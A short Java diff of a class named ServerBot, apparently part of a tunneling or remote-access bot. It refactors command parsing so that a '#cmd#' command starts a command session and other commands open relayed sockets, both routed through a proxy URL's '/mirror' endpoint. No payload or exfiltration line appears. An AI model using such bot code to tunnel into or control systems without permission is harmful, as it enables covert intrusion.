@@ -109,13 +109,15 @@ public class ServerBot extends Thread {
         sockRestIdBackUp = sockRestId;
         Thread.sleep(LinkAbstract.delay);
       }
-      if (command.equals("cmd")) {
+      String[] info = command.split(":");
+      
+      if (info[0].equals("#cmd#")) {
         CMD cmd = new CMD();
-        cmd.startSend(proxyUrl.concat("/mirror"), sockRestId);
+        cmd.startSend(proxyUrl.concat("/mirror"), sockRestId,info[1]);
         return;
       }
-      String[] info = command.split(":");
-      sock = openSocket(command);
+      
+      sock = openSocket(info);
       SEND send = new SEND();
       send.startSend(proxyUrl.concat("/mirror"), sock, info[2]);
       RECV recv = new RECV();
@@ -147,11 +149,10 @@ public class ServerBot extends Thread {
     }
   }
 
-  private static Socket openSocket(String command) throws Exception {
+  private static Socket openSocket(String[] command) throws Exception {
     Socket socket;
-    String[] info = command.split(":");
-    String host = info[0];
-    int port = Integer.valueOf(info[1]);
+    String host = command[0];
+    int port = Integer.valueOf(command[1]);
     try {
       InetAddress inteAddress = InetAddress.getByName(host);
       SocketAddress socketAddress = new InetSocketAddress(inteAddress, port);
